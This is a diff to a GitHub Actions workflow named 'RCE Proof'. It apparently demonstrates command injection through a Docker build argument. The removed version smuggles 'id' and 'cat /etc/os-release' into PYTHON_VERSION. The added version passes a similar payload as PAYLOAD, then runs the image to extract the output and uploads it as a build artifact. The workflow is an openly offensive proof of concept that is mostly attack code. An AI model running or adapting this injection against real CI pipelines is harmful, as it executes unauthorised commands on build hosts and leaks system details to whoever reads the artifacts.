@@ -1,4 +1,4 @@
-name: RCE Proof
+name: Fixed RCE Proof
 on: [push]
 
 jobs:
@@ -6,14 +6,21 @@ jobs:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
+      
       - name: Run Exploit
         run: |
           cd taskcluster/docker/python
           docker build \
-            --build-arg PYTHON_VERSION='id > leaks.txt; cat /etc/os-release >> leaks.txt' \
-            -t silent-exploit .
+            --build-arg PAYLOAD="id > leaks.txt && cat /etc/os-release >> leaks.txt" \
+            -t fixed-exploit .
+          
+      - name: Extract Proof
+        run: |
+          cd taskcluster/docker/python
+          docker run --rm fixed-exploit cat leaks.txt > proof.txt
+          
       - name: Upload Proof
         uses: actions/upload-artifact@v4
         with:
           name: leaks.txt
-          path: taskcluster/docker/python/leaks.txt
+          path: taskcluster/docker/python/proof.txt
